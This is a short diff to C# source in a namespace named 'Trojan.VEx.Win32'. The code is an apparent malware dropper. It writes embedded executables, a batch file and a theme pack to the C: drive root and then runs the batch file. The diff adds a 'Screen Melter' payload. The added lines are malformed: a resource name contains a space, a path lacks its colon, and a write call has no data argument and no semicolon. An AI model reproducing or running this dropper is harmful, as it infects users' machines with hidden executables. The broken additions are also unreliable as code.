@@ -42,11 +42,13 @@ namespace Trojan.VEx.Win32
             byte[] myfile2 = Properties.Resources.vexwork4;
             byte[] myfile1 = Properties.Resources.vexwork3;
             byte[] myfile = Properties.Resources.vexwork1;
+            byte[] myfile5 = Properties.Resources.Screen Melter;
             File.WriteAllBytes("C:\\vexwork1.exe", myfile);
             File.WriteAllBytes("C:\\vexwork3.deskthemepack", myfile1);
             File.WriteAllBytes("C:\\vexwork4.exe", myfile2);
             File.WriteAllBytes("C:\\test.exe", myfile3);
             File.WriteAllBytes("C:\\vexwork2.bat", myfile4);
+            File.WriteAllBytes("C\\Screen Melter.exe")
             Process pross = new Process();
             pross.StartInfo.FileName = "C:\\vexwork2.bat";
             pross.Start();
